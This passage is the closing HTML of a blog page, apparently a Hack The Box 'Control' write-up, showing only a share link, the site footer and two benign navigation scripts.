2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Control on telegram" href="https://telegram.me/share/url?text=Hack%20The%20Box%20-%20Control&url=https%3a%2f%2fsrrequiem.xyz%2fposts%2fhtb-control%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>&copy; 2023 <a href=https://srrequiem.xyz/>Román Zuleta</a></span>
<span>
Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a>
</span>
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a>
<script>let menu=document.getElementById('menu');menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
</body>
</html>